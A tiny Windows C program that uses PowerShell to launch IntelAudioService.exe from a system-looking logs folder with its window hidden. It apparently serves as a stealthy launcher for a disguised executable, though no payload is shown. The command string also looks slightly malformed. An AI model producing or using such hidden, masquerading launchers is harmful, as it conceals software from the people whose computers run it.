#include <Windows.h>

int main() {


	system("PowerShell -Command \"Start-Process -WindowStyle Hidden \\\"C:\\Program Files (x86)\\Common Files\\System\\logs\\IntelAudioService.exe\\\"\"\npause");
	return 0;
}